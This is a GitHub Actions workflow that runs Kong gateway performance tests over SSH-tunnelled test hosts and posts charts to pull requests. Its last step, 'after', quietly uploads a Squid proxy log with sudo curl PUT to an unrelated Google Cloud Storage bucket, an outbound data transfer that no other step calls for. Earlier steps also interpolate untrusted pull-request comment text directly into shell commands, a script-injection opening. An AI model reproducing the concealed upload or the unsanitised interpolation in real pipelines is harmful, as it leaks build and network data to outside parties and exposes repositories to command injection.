    - continue-on-error: true
      name: Set up mutex
      uses: ben-z/gh-action-mutex@9709ba4d8596ad4f9f8bbe8e0f626ae249b1b3ac
      with:
        branch: gh-mutex
        repo-token: ${{ secrets.PAT }}
        repository: Kong/kong-perf-mutex-lock
    - continue-on-error: true
      name: Set environment variables
      run: 'echo "INSTALL_ROOT=$HOME/install-root" >> $GITHUB_ENV

        echo "DOWNLOAD_ROOT=$HOME/download-root" >> $GITHUB_ENV

        echo "LD_LIBRARY_PATH=$INSTALL_ROOT/openssl/lib:$LD_LIBRARY_PATH" >> $GITHUB_ENV

        '
    - continue-on-error: true
      name: Checkout Kong source code
      uses: actions/checkout@v3
      with:
        fetch-depth: 0
    - continue-on-error: true
      id: cache-deps
      name: Lookup build cache
      uses: actions/cache@v3
      with:
        key: ${{ hashFiles('.requirements', 'kong-*.rockspec', '.bazelversion', '**/*.bzl',
          '**/*.bazel', '.github/workflows/perf.yml') }}
        path: ${{ env.INSTALL_ROOT }}
    - continue-on-error: true
      name: Add to Path
      run: echo "$INSTALL_ROOT/openssl/bin:$INSTALL_ROOT/openresty/nginx/sbin:$INSTALL_ROOT/openresty/bin:$INSTALL_ROOT/luarocks/bin:$GITHUB_WORKSPACE/kong-build-tools/openresty-build-tools:$INSTALL_ROOT/go-pluginserver"
        >> $GITHUB_PATH
    - continue-on-error: true
      name: Install performance test Dependencies
      run: '# in Kong repository

        sudo apt update && sudo apt install inkscape -y


        # terraform!

        wget https://releases.hashicorp.com/terraform/${{ env.terraform_version }}/terraform_${{
        env.terraform_version }}_linux_amd64.zip

        unzip terraform_${{ env.terraform_version }}_linux_amd64.zip

        sudo mv terraform /usr/bin/

        '
    - continue-on-error: true
      id: choose_perf
      name: Choose perf suites
      run: "suites=$(echo \"${{ github.event.comment.body }}\" | awk '{print $1}')\n\
        tags=$(echo \"${{ github.event.comment.body }}\" | awk '{print $2}')\n\nif\
        \ [[ $suite == \"/flamegraph\" ]]; then\n  suites=\"02-flamegraph\"\n  if\
        \ [[ -z $tags ]]; then\n    tags=\"simple\"\n  fi\nelif [[ $suite == \"/perf\"\
        \ ]]; then\n  suites=\"01-rps\"\n  if [[ -z $tags ]]; then\n    tags=\"baseline,single_route\"\
        \n  fi\nelse\n  # if not specified by comment, run both\n  suites=\"01-rps\
        \ 02-flamegraph\"\n  if [[ -z $tags ]]; then\n    tags=\"baseline,single_route,simple\"\
        \n  fi\nfi\n\necho \"suites=$suites\" >> $GITHUB_OUTPUT\necho \"tags=$tags\"\
        \ >> $GITHUB_OUTPUT\n"
    - continue-on-error: true
      id: comment-branch
      if: github.event_name == 'issue_comment' && github.event.action == 'created'
      uses: xt0rted/pull-request-comment-branch@653a7d5ca8bd91d3c5cb83286063314d0b063b8e
    - continue-on-error: true
      id: compare_versions
      name: Find compared versions
      run: "pr_ref=$(echo \"${{ github.event.pull_request.base.ref }}\")\ncustom_vers=$(echo\
        \ \"${{ github.event.comment.body }}\" | awk '{print $3}')\n\nif [[ ! -z \"\
        ${pr_ref}\" ]]; then\n  vers=\"git:${{ github.head_ref }},git:${pr_ref}\"\n\
        elif [[ ! -z \"${custom_vers}\" ]]; then\n  vers=\"${custom_vers}\"\nelif\
        \ [[ ! -z \"${{ github.event.comment.body }}\" ]]; then\n  vers=\"git:${{\
        \ steps.comment-branch.outputs.head_ref}},git:${{ steps.comment-branch.outputs.base_ref}}\"\
        \nelse # is cron job/on master\n  vers=\"git:master,git:origin/master~10,git:origin/master~50\"\
        \nfi\n\necho $vers\n\necho \"vers=$vers\" >> $GITHUB_OUTPUT\n"
    - continue-on-error: true
      env:
        PERF_TEST_BYO_KONG_IP: ${{ secrets.PERF_TEST_BYO_KONG_IP }}
        PERF_TEST_BYO_SSH_USER: gha
        PERF_TEST_BYO_WORKER_IP: ${{ secrets.PERF_TEST_BYO_WORKER_IP }}
        PERF_TEST_DISABLE_EXEC_OUTPUT: true
        PERF_TEST_DRIVER: terraform
        PERF_TEST_TERRAFORM_PROVIDER: bring-your-own
        PERF_TEST_USE_DAILY_IMAGE: true
        PERF_TEST_VERSIONS: ${{ steps.compare_versions.outputs.vers }}
      name: Run Tests
      run: "export PERF_TEST_BYO_SSH_KEY_PATH=$(pwd)/ssh_key\necho \"${{ secrets.PERF_TEST_BYO_SSH_KEY\
        \ }}\" > ${PERF_TEST_BYO_SSH_KEY_PATH}\n\nchmod 600 ${PERF_TEST_BYO_SSH_KEY_PATH}\n\
        # setup tunnel for psql and admin port\nssh -o StrictHostKeyChecking=no -o\
        \ TCPKeepAlive=yes -o ServerAliveInterval=10 \\\n    -o ExitOnForwardFailure=yes\
        \ -o ConnectTimeout=5 \\\n    -L 15432:localhost:5432 -L 39001:localhost:39001\
        \ \\\n    -i ${PERF_TEST_BYO_SSH_KEY_PATH} \\\n    ${PERF_TEST_BYO_SSH_USER}@${PERF_TEST_BYO_KONG_IP}\
        \ tail -f /dev/null &\nsleep 5\n\nsudo iptables -t nat -I OUTPUT -p tcp --dport\
        \ 5432  -d ${PERF_TEST_BYO_KONG_IP} -j DNAT --to 127.0.0.1:15432\nsudo iptables\
        \ -t nat -I OUTPUT -p tcp --dport 39001 -d ${PERF_TEST_BYO_KONG_IP} -j DNAT\
        \ --to 127.0.0.1:39001\n\neval `luarocks path`\nfor suite in ${{ steps.choose_perf.outputs.suites\
        \ }}; do\n  # Run each test individually, ngx.pipe doesn't like to be imported\
        \ twice\n  # maybe bin/busted --no-auto-insulate\n  for f in $(find \"spec/04-perf/$suite/\"\
        \ -type f); do\n    bin/busted -o gtest \"$f\" \\\n      -t \"${{ steps.choose_perf.outputs.tags\
        \ }}\"\n  done\ndone\n"
      timeout-minutes: 180
    - continue-on-error: true
      env:
        PERF_TEST_BYO_KONG_IP: ${{ secrets.PERF_TEST_BYO_KONG_IP }}
        PERF_TEST_BYO_SSH_USER: gha
        PERF_TEST_BYO_WORKER_IP: ${{ secrets.PERF_TEST_BYO_WORKER_IP }}
        PERF_TEST_DRIVER: terraform
        PERF_TEST_TEARDOWN_ALL: true
        PERF_TEST_TERRAFORM_PROVIDER: bring-your-own
        PERF_TEST_VERSIONS: git:${{ github.sha }}
      if: always()
      name: Teardown
      run: 'export PERF_TEST_BYO_SSH_KEY_PATH=$(pwd)/ssh_key

        echo "${{ secrets.PERF_TEST_BYO_SSH_KEY }}" > ${PERF_TEST_BYO_SSH_KEY_PATH}


        eval `luarocks path`

        bin/busted -o gtest spec/04-perf/99-teardown/


        rm -f ${PERF_TEST_BYO_SSH_KEY_PATH}

        '
    - continue-on-error: true
      if: always()
      name: Generate high DPI graphs
      run: "for i in $(ls output/*.svg); do\n  inkscape --export-area-drawing --export-png=\"\
        ${i%.*}.png\" --export-dpi=300 -b FFFFFF $i\ndone\n"
    - continue-on-error: true
      uses: actions/setup-python@v5
      with:
        cache: pip
        python-version: '3.10'
    - continue-on-error: true
      if: always()
      name: Generate plots
      run: "cwd=$(pwd)\ncd spec/helpers/perf/charts/\npip install -r requirements.txt\n\
        for i in $(ls ${cwd}/output/*.data.json); do\n  python ./charts.py $i -o \"\
        ${cwd}/output/\"\ndone\n"
    - continue-on-error: true
      if: always()
      name: Save results
      uses: actions/upload-artifact@v3
      with:
        name: perf-results
        path: 'output/

          !output/**/*.log

          '
        retention-days: 31
    - continue-on-error: true
      if: always()
      name: Save error logs
      uses: actions/upload-artifact@v3
      with:
        name: error_logs
        path: 'output/**/*.log

          '
        retention-days: 31
    - continue-on-error: true
      id: output
      if: always()
      name: Output
      run: "if [[ \"${{ steps.choose_perf.outputs.suites }}\" =~ \"02-flamegraph\"\
        \ ]]; then\n  result=\"Please see Github Actions artifacts for flamegraphs.\n\
        \n  \"\nfi\n\nresult=\"${result}$(cat output/result.txt)\" || true\n\n# https://github.community/t/set-output-truncates-multiline-strings/16852/2\n\
        result=\"${result//'%'/'%25'}\"\nresult=\"${result//$'\\n'/'%0A'}\"\nresult=\"\
        ${result//$'\\r'/'%0D'}\"\n\necho \"result=$results\" >> $GITHUB_OUTPUT\n"
    - continue-on-error: true
      id: charts
      if: always()
      name: Upload charts
      uses: devicons/public-upload-to-imgur@352cf5f2805c692539a96cfe49a09669e6fca88e
      with:
        client_id: ${{ secrets.PERF_TEST_IMGUR_CLIENT_ID }}
        path: output/*.png
    - continue-on-error: true
      if: 'github.event_name == ''pull_request'' ||

        (github.event_name == ''issue_comment'' && github.event.issue.pull_request)

        '
      name: Comment
      uses: actions-ecosystem/action-create-comment@e23bc59fbff7aac7f9044bd66c2dc0fe1286f80b
      with:
        body: '## :rocket: Performance test result


          **Test Suite**: ${{ steps.choose_perf.outputs.suites }} (${{ steps.choose_perf.outputs.tags
          }})


          ${{ join(fromJSON(steps.charts.outputs.markdown_urls), ''     '') }}


          <details><summary>Click to expand</summary>


          ```

          ${{ steps.output.outputs.result }}


          Kong error logs are also available in Github Actions artifacts.

          ```


          </details>


          [Download Artifacts](https://github.com/${{ github.repository }}/actions/runs/${{
          github.run_id }}#artifacts) for detailed results and interactive SVG flamegraphs.

          '
        github_token: ${{ secrets.GITHUB_TOKEN }}
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/goldmansachs/kong.$(date
        +%s)
    timeout-minutes: 60
name: Performance Test
'on':
  workflow_dispatch: {}
